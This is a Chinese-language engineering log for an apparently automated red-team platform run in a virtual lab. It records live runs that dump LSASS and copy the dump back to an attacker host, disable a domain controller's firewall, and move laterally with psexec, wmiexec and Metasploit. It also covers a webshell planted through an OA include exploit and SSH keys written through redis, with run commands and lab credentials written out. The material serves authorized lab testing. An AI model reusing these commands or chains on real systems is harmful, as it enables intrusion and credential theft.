- `python -m pytest -q` → **622 passed, 1 skipped**（616 → +3 菜单闸门 +2 传输重试 +1 预算）；
- `python scripts/build_skill_index.py --check` → 19 skills（13 action / 6 support）@ `0a1b639c5a2c`，`index check: ok`；
- 新增测试文件：无（`tests/test_agents.py` / `tests/test_model_seam.py` 就地扩）。


## D38：运行输入契约与体检入口（第二靶场泛化，离线）

**要证明什么**：一次 run 的输入（图 / 部署表 / 对账表 / 运行上下文 + 三个可选项）里，「形状」与「内容」能分开 ——
换一个靶场只换内容；缺字段、写错名字**在开跑前**报出来，而不是变成一次「看起来失败了的攻击」。

### 1. 新增件

| 件 | 作用 |
| --- | --- |
| `src/inputs/bundle.py` + `scripts/check_inputs.py` | 体检入口：用**运行同款 loader**（`skills.selector.load_assets` / `load_host_map`、`runtime.chain.HOP_KINDS`、运行入口的 `@path` 口径）判 |
| `docs/product/run_input_contract.md` | 契约：四个输入 + 三个可选项逐字段；哪些通用、哪些靶场特有；报文 → 修法表；新靶场八步清单 |
| `data/samples/lab_demo/` | 第二个靶场的**完整输入包**（虚构、进 git）：图 + 部署表 + 对账表 + 运行上下文模板 + `README.md` |
| `tests/test_inputs_bundle.py` | 31 条：每个输入的干净 / 缺字段 / 写错名字，加 CLI 退出码与 `--strict` |

### 2. 红日 7：六个输入全绿

```text
python scripts/check_inputs.py --graph output/hongri7/json/Hongri7_v2.action_graph.json \
  --assets data/inputs/hongri7/assets.json --host-map data/inputs/hongri7/host_ip_map.csv \
  --context @data/inputs/hongri7/run_context.domain_admin.json \
  --node-context output/runs/D29-node-context.json --control 192.168.52.128

OK    graph         12 AND / 2 OR / 0 LEAF node(s), 13 edge(s), 7 host name(s), 1 graph role(s)
OK    assets        7 host(s), 5 endpoint(s)
OK    host-map      5 mapping(s)
OK    context       1 credential(s), 0 session(s), 0 channel(s)
OK    node-context  3 node value set(s)
OK    control       address resolution starts from 192.168.52.128
-- 6 ok / 0 warn / 0 error     EXITCODE=0
```

### 3. 第二个靶场：同一条命令形状，换一份输入

图由 `data/samples/host_demo/demo.txt`（虚构双主机导出）现场生成，四份输入收进 `data/samples/lab_demo/`。
体检读数 `5 ok / 1 warn / 0 error` —— 唯一 warn 是模板值 `PLACEHOLDER`（本来就该报）；
`run_agent.py` 干跑（默认 plan，不触网）读数 `plan: 3 step(s)`、`EXITCODE=0`：

| step | action | node | target（按部署表解析） | method |
| --- | --- | --- | --- | --- |
| 1 | run_node | 2 | `host_a` = 192.0.2.10:443 | case `valid_accounts`，`candidates: 0` |
| 2 | run_node | 7 | `host_b` = 192.0.2.11:22 | case `remote_services_without_cve`，`candidates: 0` |
| 3 | aggregate | 6 | — | 终点 OR 聚合 |

**怎么读**：地址解析与 precheck 生成（reach / privilege / credential / method）都按第二份部署表工作，
说明输入层与红日 7 无关；`candidates: 0` 是**技能面**的如实缺口（`skills/index.json` 的 `by_case` 里没有这两个 case），
不是输入契约的问题 —— 这正是「输入体检」与「技能覆盖」必须分开说的原因。

### 4. 失败路径（故意打破的读数）

| 打破 | 读数 |
| --- | --- |
| 部署表 `host_b.ips = []` | `ERROR assets host 'host_b' (vm) has no ips - ... the target gate cannot align` |
| 部署表端点主机写成 `host_c` | `ERROR assets endpoint ... executes on 'host_c', which is not a host in this table` |
| 部署表 `connect_port = "twenty-two"` | `ERROR assets endpoint ... has a bad connect_port: 'twenty-two'` |
| 对账表 `host_b,not-an-ip` | `ERROR host-map line 3: 'host_b' -> 'not-an-ip' is not an IPv4 address` |
| 对账表写成转换工具那份（带 `host,ip` 表头） | `WARN host-map line 1 is the converter's header ...` + `host -> ip` 幽灵映射被点出 |
| 上下文顶层键写成 `credential` | `WARN context top-level key(s) the run never reads: credential ...` |
| 整包合计 | `-- 3 ok / 5 warn / 4 error`，**EXITCODE=2**，`input bundle refused: fix the error(s) above before the run reads these files` |

### 5. 本轮顺带确认的两件事（已写进契约）

- **同名 `host_ip_map.csv` 两个 loader 两套表头规则**：`selector.load_host_map`（run 与判定器）**没有表头概念**
  （表头会变成 `host -> ip` 的幽灵映射），`graph.host_identifiers.load_mapping`（转换工具）**要求**首行 `host,ip`。
  给 `--host-map` 的那份不写表头；体检对表头只报 warn，不替操作者决定。
- **凭据键 = 图上的账户名**：体检两边对账（图上 `semantics.details.accounts[].user` / `credential_fact_ref` ↔ 上下文 `credentials` 的键），
  对不上就报「the graph asks for account(s) with no credential here」—— D32-h 那条教训在输入侧的防线。

## 真机单点复验 · D39（2026-09-16）：目标状态补齐后的节点 41 链

补的是[技能补卡清单](skill_backlog.md) 第 1 条的 **B 路线**：dump 之前先让域管在 pc1 上有一次**交互式**登录，再跑链。
技能注册表 19 条不变、输出契约不变 —— 这轮动的是**目标状态**。

### 1. 运行前的目标状态（人工一步，写进复盘）

- 域管登录：pc1 控制台（VMware VNC `127.0.0.1:5901`，`scripts/vnc_console.py`）→「切换用户」→
  `WHOAMIANONY\Administrator` + `Whoami2021`；登录后 `qwinsta` 读数 = `console  Administrator  2  连接`
  （会话 2；`output/diag/D39/d39sess_out.txt`，抓帧 `output/diag/D39/pc1-console-19-filled.png`、`-21-desktop.png`）。
- 解析侧对得上同一条会话：`logon_time 2026-09-16T00:23:12Z`、`session_id 2`。
- 同轮取证的环境缺陷（**不是**本轮引入）：AD 里 pc1 的机器账号不存在（`CN=Computers` 只有 `DC$` / `PC2$`），
  `nltest /sc_query` 报 `1787`；用域管凭据经 LDAP 补建 `CN=PC1`（`sAMAccountName=PC1$`、`uac=4096`）后变为 `5`。
  `netdom` 在本通道不可用（`/?` 即挂死：服务会话 + stdout 是管道），WMI `JoinDomainOrWorkgroup` 返回 `2691`（ERROR_MACHINE_ALREADY_JOINED）。
  取证脚本与产物：`output/diag/D39/`（`ad_pc1.ps1`、`d39_tc.cmd`、`d39_proc.cmd`、`d39_sess.cmd`、`pc1-console-*.png`）。

### 2. 复现命令

```powershell
$env:AGV_SSH_PASSWORD="kali"
python scripts/run_agent.py --graph output/hongri7/json/Hongri7_v2.action_graph.json --run-dir output/runs/D39-live1 --remote kali@192.168.52.128 --password kali --assets data/inputs/hongri7/assets.json --host-map data/inputs/hongri7/host_ip_map.csv --control 192.168.52.128 --node-context output/runs/D29-node-context.json --timeout 60 --live
```

### 3. 读数（`output/runs/D39-live1`）

| 项 | 值 |
| --- | --- |
| run 状态 | `blocked`（8 节点 `succeeded`，其中 1 个 `skip_node`；6 个 `blocked`）|
| 链 | `lsass_minidump`：`cred.comsvcs_minidump` → `transfer.http_post_file` → `cred.pypykatz_parse` 三段全 `pass`，`chain_done` |
| 解析证据 | `node-5/attempt-3-cred.pypykatz_parse/call-20260916T082601-663b1e/` |
| dump 摘要 | `dump_sha256=bec54676e5534880c1857e5fcd857645fbbc4a182a55f522de745bae6ef0d057`（`/home/kali/agv-loot/lsass-pc1.dmp`）|
| 域管会话 | `username Administrator` / `domainname WHOAMIANONY` / `session_id 2` / `logon_server DC` / `sid S-1-5-21-…-500` |
| 域管材料 | `MSV NT=ab89b1295e69d353dd7614c7a3a80cec`、`WDIGEST password Whoami2021`、`Kerberos Password: Whoami2021`、`TSPKG`、`DPAPI` |
| `credential_material` | `Administrator`（`nt` + `plaintext`）、`bunny`（`nt` + `plaintext`）、`PC1$`（`nt`）|
| 模型接缝 | `model.client=none`、`calls=0`（本轮不开模型；三个接缝仍由规则先算）|

**与 D32-live3 的关系**：同一条链。D32-live3 那次图还是旧编号（lsass = `node-41`），
D32-h 之后图按新导出顺序重生成（编号位移是已记录事实：lsass `41 → 5`、pc1→dc 横向 `38 → 44`、dc 聚合 `37 → 43`），
所以本轮落在 `node-5`。两次的唯一自变量是：**dump 前 pc1 上多了一条域管交互式会话**（对照：`bunny`、`PC1$` 两次都在）。

### 4. 本轮没闭环的部分（如实记，别读成「38/48 也通了」）

D39-live1 的 `run_result.json` 里 `credentials[]` 已经**有** `Administrator`（`source: "node 5"`、`has_secret: true`）——
链确实把域管材料带回来了。但节点 2 / 44 / 48 仍然 `blocked/need`，原文是：

> the run holds no usable credential for **dc:domain_administrator**; … the run holds: Administrator, PC1$, bunny

原因是**账本的键不一样**，而且运行层已经自己把这件事点名了：

- 图上账户槽位用的是**角色键**（`domain_administrator`）；D32-h 的显式运行输入就把凭据存在这个键下
  （`run_context.domain_admin.json` 的 `credentials.domain_administrator.user = Administrator`），供给查找按同一个键，所以 44/48 在 `D32h-live3` 能供给；
- 解析链产出的材料只带**登录名**，`run.absorb_evidence` 只按登录名入账（`Administrator` 与 `WHOAMIANONY\Administrator` 两条），
  查找 `domain_administrator` 自然对不上；
- 平台对这件事的定案写在 `run.bridge_accounts`：**不猜映射**（把「手里有个账号」升格成「手里有这个权限」是 D24-c 拒绝过的伪证据），
  只记一条 `bridge` 假设。D39-live1 的 `assumptions[]` 里就有这一条：
  `{"node": "5", "fact": "domain_administrator", "text": "pc1:domain_administrator", "kind": "bridge"}`（`why`："the run holds 2 non-machine account(s) and this graph role is not one of them: supply the credential under the graph name (or state the mapping explicitly) - the run does not guess it"）。

所以 B 路线闭环的准确表述是：**「环境前置成立 + 解析链能读出域管」**，不是「凭据自动供给已闭环」。
要让 44/48 也吃上这条链的产出，得在运行输入里**显式**登记这条映射（`domain_administrator → WHOAMIANONY\Administrator`）——
这与现在 A 路线直接给凭据是同一个动作，差别只在材料来源写的是「链产出」还是「操作者输入」。

## 真机整图复验 · D40（2026-09-16）：账户别名输入闭环 + 防火墙「开→关」转变证据 + 两条 kali-vantage 备选卡转正

这一轮把 D39 §4 留下的**账本键名缺口**按「操作者显式登记映射」闭掉，顺手把靶场里两条还挂着的备选卡推上真机，
路上抓到三个真缺陷（两处卡片拼装、一处共享解析器）。技能注册表 19 条不变；变的是一处**运行输入**字段
（`account_aliases`，D38 输入契约的扩展，见 `run_input_contract.md` §2.4）。

### 1. 与 D39-live1 的唯一自变量：运行输入多了 `account_aliases`

`data/inputs/hongri7/run_context.alias_only.json`（**不含 secret**）：

```json
{"account_aliases": {"domain_administrator": {"user": "Administrator", "domain": "WHOAMIANONY",
  "provenance": "operator input (D40): the domain-admin interactive session on pc1 that D39 read out of LSASS ..."}},
 "credentials": {}, "sessions": {}, "channels": {}}
```

- 材料必须由链现场产出（`credentials` 是空的）：这一轮验的正是「链产出 → 图上槽位」这一段，
  不是「操作者给凭据」那条老路（A 路线仍然可用，两条口径在产物里分得开）。
- 体检：`python scripts/check_inputs.py data/inputs/hongri7/run_context.alias_only.json ...` 读数 **6 ok / 0 warn / 0 error**（EXITCODE=0）。
- 语义：平台仍然**不猜**映射（`run.bridge_accounts` 的定案）。别名只在操作者显式声明后生效，生效时记一条
  `kind=alias` 假设，并把已持有的登录名条目复制到图上角色键下（带 `bridged_from` / `alias_provenance`）。

### 2. 复现命令（两跑）

```powershell
$env:AGV_SSH_PASSWORD="kali"
D:\Conda\python.exe scripts\run_agent.py --graph output/hongri7/json/Hongri7_v2.action_graph.json `
  --run-dir output/runs/D40-live1 --remote kali@192.168.52.128 --password kali `
  --assets data/inputs/hongri7/assets.json --host-map data/inputs/hongri7/host_ip_map.csv `
  --control 192.168.52.128 --node-context output/runs/D29-node-context.json `
  --context @data/inputs/hongri7/run_context.alias_only.json --timeout 60 --live
```

D40-live2 之前多一步**操作者动作**：把 DC 的防火墙恢复成「开」，让节点 2 的证据从「关着」变成「开→关」的转变（见 §4）。

### 3. 读数（两跑一致）

| 验收项（D39 写死） | D39-live1 | D40-live1 / D40-live2 |
| --- | --- | --- |
| `assumptions[]` 里 `kind=bridge`（domain_administrator） | 有 1 条 | **0 条**；换成 1 条 `kind=alias` |
| `run_result.account_aliases[]` | 字段还不存在 | `target_held=true` / `filed=true` |
| 节点 2 / 44 / 48 | `blocked/need` × 3 | **`succeeded` / `done` × 3** |

补充读数：run 状态 `succeeded` / `done_all`（14/14 节点结算）、`blockers: null`、`graph_gaps: []`、`skill_gaps: []`、
`model.calls=0`（本轮不开模型接缝，主线仍全规则算），25 次 call（D40-live1：08:50:29 → 08:51:21；D40-live2：08:53:14 → 08:55:13）。

节点证据锚点（D40-live2）：

- 节点 2（`evasion.wmi_firewall_off`）：`output/runs/D40-live2/node-2/attempt-1-defense_evasion.remote_disable_firewall_wmi/call-20260916T085452-e61450/`；
- 节点 44（`exec.wmic_remote_cmd` → dc）：`call-20260916T085501-ea96a2`，回显 `hostname=DC` / `whoamianony\administrator` / `S-1-5-21-…-500`；
- 节点 48（同卡 → pc2）：`call-20260916T085521-b278ab`，回显 `hostname=PC2` / 同身份；
- 节点 5 链仍然 `chain_done`：dump 36 684 738 B（`MAGIC=MDMP`）→ 外带（双边核对）→ 解析出 `Administrator` / `Whoami2021`（与 D39 同批读数）。

### 4. 防火墙的「开→关」转变证据（D40-live2）

D40-live1 里节点 2 的判据是 **state-only**（卡片自己声明「no change claimed」）：它证明「调用之后是关的」，
不声称「是它关的」。当时 DC 的防火墙在 D24-e 就已经被关掉了，所以那次读数**不构成转变证据**。
D40-live2 之前先把它恢复成开：

| 时点 | DomainProfile | StandardProfile | PublicProfile | 谁做的 |
| --- | --- | --- | --- | --- |
| 跑之前（恢复） | `0x1` | `0x1` | `0x1` | 操作者（kali → DC，域管凭据；读数 `output/diag/D40/d40_rearm.json`）|
| 同一次 call 内、动作之前 | `0x1` | `0x1` | `0x1` | 目标自己的回显 |
| 同一次 call 内、动作之后 | `0x0` | `0x0` | `0x0` | **节点自己的动作** |

同一份 stdout 里 before / after 两段都在，标记块（`agve61450before` / `after` / `done`）来自目标自己那块回显。

### 5. 备选卡实机复验：`exec.impacket_psexec_cmd` / `exec.impacket_wmiexec_cmd`

kali vantage：控制点 kali → dc / pc2。D24-e 记的「Kali 到不了 93 网段」在 D40 实测**不成立**（kali → dc/pc2 的 445/135 都通，
`output/diag/D40/d40_reach.json`），这两张卡因此第一次具备执行位置。默认路径的锁定不变：仍然锁 Windows vantage 的 `wmi_process`
（锁的是图里的 source 门 + 注册表顺序，不是可达性）。

| 卡 | run | call | 读数 | 状态 |
| --- | --- | --- | --- | --- |
| psexec | `output/runs/D40-card-psexec-dc3` | `call-20260916T090032-7451ee` | `hostname=DC` / `nt authority\system` / `S-1-5-18` / `exit_code=0`，三闸全过 | `planned → implemented` |
| wmiexec | `output/runs/D40-card-wmiexec-pc2b` | `call-20260916T090036-6c2846` | `hostname=PC2` / `whoamianony\administrator` / `S-1-5-21-…-500` / `exit_code=0`，三闸全过 | `planned → implemented` |

**路上抓到的三个真缺陷（都已修 + 有回归）**：

1. **impacket 没有 `-p`**：`impacket-psexec -p <pw>` 在 0.11 里是 `-path` / `-port` 的**歧义前缀** → 解析阶段就 usage 报错、
   **完全不碰网络**（`D40-card-psexec-dc/call-20260916T085717-818e50`，rc=2）。修法：新增共享的
   `runtime.adapter.impacket_arguments`（目标参数写成 `domain/user:password@host`，哈希仍走 `-hashes`），两张卡都改用它。
2. **wmiexec 的重定向只覆盖链尾**：impacket 把载荷拼成 `cmd.exe /Q /c <payload> 1> \\127.0.0.1\ADMIN$\__<ts>`，
   而 cmd 的 `&` 链里重定向**只作用于最后一条命令** → 取回文件里只剩 `<m>end`（`D40-card-wmiexec-pc2` 首跑）。
   修法：探针自带一层 `cmd /c "..."`；kali 侧三组对照实验留在 `output/diag/D40/d40_wmiexec_*.json`。
3. **交互式 shell 的退格字节遮住 marker**：psexec 的首个回显块前面带一个 `\x08`，共享的 `split_sections` 认不出标记 →
   `hostname` 丢字段（`D40-card-psexec-dc2` 首跑；同一份证据里身份 / SID 却是好的）。修法：`_tag_line` 只在**判定标记行**时
   去掉 C0 控制字节（内容行原样保留），并有回归测试。

### 6. 仍然没闭环的（如实记）

- `evasion.netexec_firewall_off`（netexec 版）**仍 `planned`**。D40 复核了它的前提：控制点上没有 `netexec`，
  且 PyPI 上**没有这个发行版**（`https://pypi.org/pypi/netexec/json` → 404；kali 仓库只有 `crackmapexec 5.4.0`）。
  下一步：先给控制点补 netexec（pipx / GitHub release wheel / 更新控制点镜像），再回 `run_skill_remote.py` 单卡取证。
  不影响红日 7 的结论：节点 2 由 `..._wmi` 跑通，本卡只是**同验证目标的另一条方法**。
- **环境事实（记录，不在本轮范围）**：pc1 与 DC 的**安全通道是断的**——从 kali 用域管凭据打 pc1 的 SMB 回
  `STATUS_TRUSTED_RELATIONSHIP_FAILURE`（`output/diag/D40/d40_sessions_probe.json`）。这与 D39「AD 里 pc1 的机器账号是补建的」互证；
  对本轮无影响：pc1 的执行位置走 OA 通道（本机 SYSTEM），节点 44/48 的认证目标是 dc / pc2。
- 本轮**没有**改环境前置：pc1 上那条域管交互式登录沿用 D39 留下的，D40 两跑都还能从 LSASS 里读出来。

### 7. 清理与 suspend（做完才收工）

- `python output/diag/D31/lab_cleanup_d31.py output/runs/D40-live2`（container / kali / pc1 / redis 四步）：
  容器宿主 marker + `/hello` + 助手目录清、web1 `agv.shell.php` 回 404、kali loot / 接收日志清、
  pc1 `C:\Windows\Temp\agv_*` 7 → 0、OA 载荷 2 → 0、redis `DBSIZE 1 → 0`；
- 目标侧复核：dc / pc2 无 `agv*` 残留、无 `RemComSvc` / psexec 服务残留、`C:\Windows\*.exe` 只有系统自带；
- 六台 VM 全部 `suspend`：`vmrun list` = `Total running VMs: 0`。

## D41：netexec 版关防火墙卡实机闭环（`evasion.netexec_firewall_off`，`planned → implemented`）

D40 §6 留的缺口（控制点上没有 netexec）本轮闭掉：在控制点装上 **NetExec 1.5.1**，用 `scripts/run_skill_remote.py` 单卡跑通。
两步都走 SCM 服务执行（`--exec-method smbexec`，对应图里的 `scm/445`）；apply 段只记录，判定锚点 = readback 段。

### 1. 装 netexec（控制点 kali，全部实测可复现）

- 直连 `github.com` / `pypi.org` 超时，`codeload.github.com` 可达：
  `curl -sSL https://codeload.github.com/Pennyw0rth/NetExec/tar.gz/refs/tags/v1.5.1`（1,334,111 B）。
- 裸 tarball 构建失败（打包元数据用 dunamai 从 git tag 取版本）：解压后 `git init && git add -A && git commit && git tag v1.5.1`。
- pyproject 里 4 条 `git+https://` 依赖（certipy-ad / impacket / oscrypto / pynfsclient）不可拉 → 先删；
  其余依赖走清华 PyPI 镜像：`pip3 install --user --break-system-packages -i https://pypi.tuna.tsinghua.edu.cn/simple <deps>`。
- 本体：`pip3 install --user --break-system-packages -i https://pypi.tuna.tsinghua.edu.cn/simple --no-deps .`
  （`--no-deps` 也必须带镜像参数，否则 build isolation 会去拉不可达的 PyPI 装 `poetry-core`）。
- 三个坑：**aardwolf 跳过**（新版要 Rust 编译；只被 rdp/vnc 协议 import，与 SMB 无关）、
  **`dploot` 必须 `<4`**（4.x 删了 `dploot.lib.smb`，NetExec 1.5.1 仍在 import）、
  **user 级 `pyOpenSSL>=24`**（user site 的新 cryptography 与系统自带 pyOpenSSL 23 的 `GEN_EMAIL` 不兼容）。
- 入口装在 `~/.local/bin`，远端非交互 PATH 上没有 → `ln -sf ~/.local/bin/netexec /usr/local/bin/netexec`。
- 版本读数：`netexec 1.5.1 - Yippie-Ki-Yay - 617a4f6`；边界：rdp/vnc 不可用，SMB 链路完整。

### 2. 跑卡读数（先 rearm，再取「转变证据」）

- 按 D40 §4 口径先复位：跑卡前用 netexec 把 DC 三 profile 从 `0x0` 复位回 `0x1`
  （`netsh advfirewall set allprofiles state on` + `reg query` 复核，`output/diag/D41/rearm_run.txt`）。
- 两轮跑卡各留完整 call 记录（`output/runs/D41-card-firewall` / `D41-card-firewall2`）：

| 轮次 | apply（只记录） | readback（判定锚点） | 判定 |
| --- | --- | --- | --- |
| 首跑 | `call-20260916T092931-d9616a` | `call-20260916T092932-de27e1` | 三闸全过，`firewall_state=disabled` |
| 收尾对照 | `call-20260916T093249-fca3eb` | `call-20260916T093251-5a540f` | 三闸全过，`firewall_state=disabled` |

- 转变证据（两段拼合、时序相邻）：复位数三 profile `0x1`（`rearm_run.txt`）→ 卡 readback 三 profile `0x0`
  （`output/runs/D41-card-firewall2/call-20260916T093251-5a540f/stdout.txt`）——「开 → 关」成立。

### 3. 抓到的真缺陷：中文系统的 netsh 文本经 smbexec 是 cp437 乱码

- 旧 readback 走 `netsh advfirewall show allprofiles state` 并按「状态 / 关闭」字面匹配；D41 实测中文 DC 的输出经 smbexec
  到达是 cp437 乱码（`╫┤╠¼ ╣╪▒╒`）→ 按本地化文本匹配的解析会**静默失手**（证据看得见、判定读不出，比报错更危险）。
- 修法：readback 固定走注册表 `reg query ...\FirewallPolicy /s /v EnableFirewall`；`EnableFirewall REG_DWORD` 的
  `0x0/0x1` 与系统语言无关。判定口径不变：三 profile 全 `0x0` 才算 `disabled`，任一 `0x1` 就是 `enabled`，读不到记 `uncertain`。
- 回归锁死：`test_state_reads_disabled_only_when_every_profile_is_off` 刷新为注册表读数；
  `test_localized_netsh_text_is_not_relied_on` 锁「本地化文本与 cp437 乱码样例都不得进入判定」。

### 4. 卡面与状态

- `skills/evasion.netexec_firewall_off/`：`skill.json` `planned → implemented`（notes 带证据锚点）；
  `SKILL.md` 重写（判定口径 / netexec 装法留档 / 坑点 / 实机记录）。
- 与 `..._wmi` 的关系不变：**同一验证目标的两条方法**——wmi 走 Windows vantage（pc1）的 WMI + 注册表回读，
  本卡走任意 vantage 的 SCM 服务执行 + 注册表回读；默认路径的锁定（图里的 source 门 + 注册表顺序）不变。
- 索引重建：`skills/index.json` `status_counts = {"implemented": 18, "planned": 1}`；唯一 `planned` 剩 `cred.kiwi_lsass_dump`（msf kiwi 版）。

### 5. 收尾（做完才收工）

- DC 残留复核：`sc query RemComSvc` → 1060「服务未安装」（无残留）；`C:\Windows\Temp` 仅系统自带 `winstore.log`
  （读数 `output/diag/D41/final_state3.txt`；复合检查命令经 netexec smbexec 会报 `Could not retrieve output file`，换 impacket wmiexec 通道即取回——本卡的固定单命令不受影响）。
- 靶场状态复位：收尾把 DC 三 profile 重新置回 `0x1`（`output/diag/D41/final_state.txt`，reg query 三 profile `0x1`）——
  回到「防火墙开」的默认态，下次复验（按 D40 §4 口径）可直接起步。
- 两台 VM（kali + DC）suspend：`vmrun list` = `Total running VMs: 0`。

## D42：OA 卡 restore 清理回合实机闭环（`exploit.tongda_oa_include_rce`）

三台 VM 在线（kali / Web 1 / PC 1，`nogui` 启动）。前置：chain `kali_to_web1.json` 依赖的 `/home/kali/.ssh/agv_session`
在 D24-d 被清过（预检 NO-KEY），先用 `session.ssh_via_redis`（restore=false）现场重建
（`D42-key/call-20260916T100222-b0c69b`，verify = `uid=0(root)@ubuntu`，8 calls）。

### 1. 默认批（restore 未传）—— 行为无回归

| run | 判定锚点 | 判定 | markers |
| --- | --- | --- | --- |
| `D42-oa-default` | `call-20260916T100250-a1f566-include` | 三闸全过 pass | 含 `include_path=.../2609/842864419...`（通道可注册） |
| `D42-oa-default2`（重跑复核） | `call-20260916T100356-a51c90-include` | 三闸全过 pass | 含 `include_path=.../2609/1039302620...` |

两次 `evidence.command_output` 均为 `nt authority\system`；`include_path_source=response` 不变。

### 2. restore 批（restore=true）—— 清理回合与通道分流

`D42-oa-restore/call-20260916T100412-240bbd-include`（4 个调用：payload → upload → include → restore）。
- 主调用（include）三闸全过 **pass**（判据不受清理影响）；
- `restore` 调用 rc=0、stdout **`AGV_RESTORE_GONE`**（目标侧 PowerShell `Test-Path` 自检）；
- markers：**不写 `include_path`**、`restore_path=C:\MYOA\attach\im\2609\320050113.agv_oa.shell.png`、`restore_status=gone`。

### 3. 独立 probe 对照（阴性/阳性）

经 web1 的 python3 客户端对两条路径发同一 probe：

| 路径 | 状态 | probe 读数 |
| --- | --- | --- |
| `.../2609/320050113.agv_oa.shell.png` | restore 已删 | **无回显**（RC=0、空输出） |
| `.../2609/1039302620.agv_oa.shell.png` | default2 未删 | 正常回显 `agvprobe9start / nt authority\system / agvprobe9end` |

### 4. 全量清理（读数为证）

- 经存活 webshell 跑 powershell 扫 `C:\MYOA`：`OA-BEFORE-COUNT=2` → purge → **`OA-LEFT-COUNT=0`**（含自删）；postprobe 空。
- web1 `/tmp/agv-payloads`（`agv_oa_http.py` + `agv_oa.shell.png`）→ `rm -rf` → `WEB1-TMP-CLEAN`。
- ssh 会话拆除：key 卡 `restore=true`（首次实机该分支，`D42-key-restore/call-20260916T100619-8c670f`：
  verify pass + `restore_file`/`restore_dir`/`restore_dbfilename` 全执行）→ 手工 `CONFIG SET dir /root`（卡内默认 `/`，
  D24-d 实测原值为 `/root`）→ `DEL agv_session_key agv_cleanup_key`；
  redis 终态 `dir=/root`、`dbfilename=dump.rdb`、KEYS 空、`DBSIZE=0`；SSH 阴性复核 `Permission denied`（authorized_keys 确已删）；
  kali `~/.ssh` 仅 known_hosts；kali / web1 / pc1 三台 `vmrun suspend`（`vmrun list` = 0）。

### 5. 附：手搓写入失败与修复（纪律）

先删 kali key 后 ssh 中断；手搓 `redis SET+SAVE` 自举（值经多层 shell 引用）换行/引号被吃、sshd 不认——**改用卡**（argv 直传）即通。
教训：授权 key 写入只走卡，不手搓。

### 6. 读数异常记录（如实留档）

`D42-oa-default` 首跑 shell 显示 `Exit code 1`；但同次 `judgement.json`=pass、离线复判（`output/diag/D42/recheck.py`）=pass、
`D42-oa-default2` 重跑 `EXIT=0`。本地「多行 stderr + 大 JSON + `2>&1 | Select-Object`」复刻实验未复现 exit 1。
结论：**判定结果三通道一致为 pass**；exit 1 无法归因（疑为 PowerShell 管道对错误流的读数污染，未复现），记录在案。

## D43：msf 常驻端点车道（kali + PC1 两台）

### 1. 预检与端点

- 靶场：kali `192.168.52.128`、PC1 `192.168.52.30`（两台 running）。
- 端点 `msfrpcd -U msf -P agvpass123 -S -a 127.0.0.1 -p 55553`（`-S` = Disable SSL → 明文 HTTP；`curl http://127.0.0.1:55553/api/` = 200 / 4.7ms）。
  客户端部署到 kali `/opt/agv/tools/agv_msf_rpc.py`（root 0755），口令文件 `msf_rpc.pass`（600）。
- 排错口径：端点日志 `/tmp/agv_msfrpcd.log`；**模块失败的真因在 framework 侧 `~/.msf4/logs/framework.log`**（RPC 回复里没有）。

### 2. 建会话卡（`session.msf_via_credentials`）

| run | call | 结果 |
| --- | --- | --- |
| `output/runs/D43-msf-establish5` | `call-20260916T105646-b9cc61` | 三闸 **pass**：route 量出 LHOST=`192.168.52.128`；探针得 `Server username: NT AUTHORITY\SYSTEM` + `Computer: PC1`；channel `{driver: msf, id: 4, shell: cmd, identity: NT AUTHORITY\SYSTEM, host: PC1}`；`--check` EXIT=0 |

- 更早两跑如实留档：`output/runs/D43-msf-establish`（客户端按旧判据把成功当失败 rc=4）、`output/runs/D43-msf-establish3`
  （`job_id: 0` 触发同一误判，但**模块真的跑成了**——3 个会话的 `exploit_uuid=kfw3hnyx` 就是那一次回复里的 uuid）、
  `output/runs/D43-msf-establish4`（120s 内无新会话，卡按契约报「无新会话」；真因来自 framework.log：
  `Exploit failed (windows/smb/psexec): Rex::Proto::SMB::Exceptions::LoginError Login Failed: closed stream`）。

### 3. kiwi 卡（`cred.kiwi_lsass_dump`）——验收锚点

| run | call | 判据 |
| --- | --- | --- |
| `output/runs/D43-lsass-kiwi2` | `call-20260916T105711-f5db55` | **四闸全过 pass**：freshness（call 锚定）/ target（`host=PC1` ↔ `192.168.52.30`）/ identity（`Running as SYSTEM` → system 等级）/ effect（`credential_material_present`，非阻断） |

读数（与 D39 comsvcs 路径逐字节一致）：`Administrator` NTLM `ab89b1295e69d353dd7614c7a3a80cec`、明文 `Whoami2021`；`bunny` `Bunny2021`；
`PC1$` 机器密码（长串完整）——`(null)` 占位行已跳过。`--check --node 41` EXIT=0。（首跑 `output/runs/D43-lsass-kiwi` 判 uncertain：
当时解析器还不认无冒号的 `Running as SYSTEM`，identity 闸无观察——如实留档。）

### 4. 实测缺陷与修复（三处）

1. `module.execute` 成功回复没有 `result` 键 → 旧判据误判失败；改「无 error + 按 uuid 认领」（客户端单测 4 条，测试还抓出超时提示对 int sid 的 `join` 崩溃）。
2. `[+] Running as SYSTEM`（**无冒号**）→ 正则兼容两种形态。
3. **kiwi 表格列错位**：机器账号 LM 为空，空白分割把 NTLM 顶进 LM 列 → 改按表头偏移切片（真 transcript 断言 10/10）；
   测试样本改由 `kiwi_table()` 生成器产出。

### 5. 更正记录：msfrpcd「挂死」是探针错协议

用 `https://127.0.0.1:55553` 探端点得 8s / 30s 超时 → 曾判「端点挂死」并重启（PID 47434 → 49648，日志落盘 `/tmp/agv_msfrpcd.log`）。
复核发现本版 `msfrpcd -S` = Disable SSL：端点一直是明文 HTTP，拿 TLS 去敲自然超时——**没有证据表明旧端点真的挂死**，
重启是本轮主动动作而非故障恢复。探针台账：`output/diag/D43/probe_proto.txt`、`state_check.txt`、`restart_msfrpcd.txt`。

### 6. 间歇性失败（如实记录）

psexec 在本靶场 5 次实测里 2 次 `Login Failed: closed stream`（22:26:17、22:50:21），其余成功；同进程稍后重试即通。
卡不隐瞒（无新会话 → 不登记通道 + observations）；**重试归 run 层**。

### 7. frag7：ponytail 清理 + kali/PC1 收尾

- **清理三处投机/冗余代码**（锚点 12 处全命中，脚本 `output/diag/D43/patch_ponytail_d43.py`）：
  kiwi 解析器删「无表头 heuristic 回落」+ 分隔线词数交叉校验（冗余第二道闸）；msf 端点客户端删「无 uuid 旧端点窗口回落」--
  改为**明确拒绝**（stderr 写明、exit 4）：复用靶场上「窗口内到达」没有归属，可能认领旧 payload 的会话，不是判据。
- **验证**：真 transcript 断言 10/10 PASS；回归 **690 passed / 1 skipped**；`build_skill_index.py --check` = ok（20 @ `4926fbe466ea`）。
- **kali**：新版客户端部署（两侧 md5 `13d16a0b44819a065827cf0dc5146a13`）；端点 PID 49648 在；`session-list` 冒烟出 sid 1-4；
  /tmp 探针删 19 件，保留端点日志 `agv_msfrpcd.log` / `.out`。
